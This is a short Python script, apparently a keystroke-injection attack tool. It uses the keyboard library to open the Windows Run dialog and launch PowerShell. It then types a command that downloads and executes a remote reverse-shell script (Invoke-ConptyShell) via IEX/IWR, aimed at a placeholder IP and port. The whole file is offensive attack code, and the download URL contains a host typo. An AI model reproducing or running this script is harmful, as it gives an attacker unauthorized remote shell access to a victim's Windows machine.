#!/usr/bin/env python3
 #________  _______   ___      ___ _______   ________  ________  _______           ________  ___  ___  _______   ___       ___               ________  ________  ________  ___  ________  _________   
#|\   __  \|\  ___ \ |\  \    /  /|\  ___ \ |\   __  \|\   ____\|\  ___ \         |\   ____\|\  \|\  \|\  ___ \ |\  \     |\  \             |\   ____\|\   ____\|\   __  \|\  \|\   __  \|\___   ___\ 
#\ \  \|\  \ \   __/|\ \  \  /  / | \   __/|\ \  \|\  \ \  \___|\ \   __/|        \ \  \___|\ \  \\\  \ \   __/|\ \  \    \ \  \            \ \  \___|\ \  \___|\ \  \|\  \ \  \ \  \|\  \|___ \  \_| 
# \ \   _  _\ \  \_|/_\ \  \/  / / \ \  \_|/_\ \   _  _\ \_____  \ \  \_|/__       \ \_____  \ \   __  \ \  \_|/_\ \  \    \ \  \            \ \_____  \ \  \    \ \   _  _\ \  \ \   ____\   \ \  \  
#  \ \  \\  \\ \  \_|\ \ \    / /   \ \  \_|\ \ \  \\  \\|____|\  \ \  \_|\ \       \|____|\  \ \  \ \  \ \  \_|\ \ \  \____\ \  \____        \|____|\  \ \  \____\ \  \\  \\ \  \ \  \___|    \ \  \ 
#  \ \__\\ _\\ \_______\ \__/ /     \ \_______\ \__\\ _\ ____\_\  \ \_______\        ____\_\  \ \__\ \__\ \_______\ \_______\ \_______\        ____\_\  \ \_______\ \__\\ _\\ \__\ \__\        \ \__\
#    \|__|\|__|\|_______|\|__|/       \|_______|\|__|\|__|\_________\|_______|       |\_________\|__|\|__|\|_______|\|_______|\|_______|       |\_________\|_______|\|__|\|__|\|__|\|__|         \|__|
#                                                        \|_________|                \|_________|                                              \|_________|                                           

import keyboard

#---starting the main method to start program
def main_start():
    start_input()

def start_input():
   #starting run to open the commandline
    keyboard.send("windows+r")
    keyboard.write("powershell")
    keyboard.send("enter")
    setup_input()

# inputing command to run nc revers shell attack

def setup_input(): 

# trying to install/setup nc in powershell
# find commands to inject/connect to netcat listener on :
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/7ab766446925ee11e3c8ddb188d7b1eb7cbea4e7/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
    keyboard.write("IEX(IWR https://raw.githubsercontent.com/antonioCoco/ConptyShell/master/invoke-ConptyShell.ps1 -useBasicParsing); Invoke-ConptyShell IP port")
    keyboard.send("enter")

# calling main_start() function to start program. 
main_start()

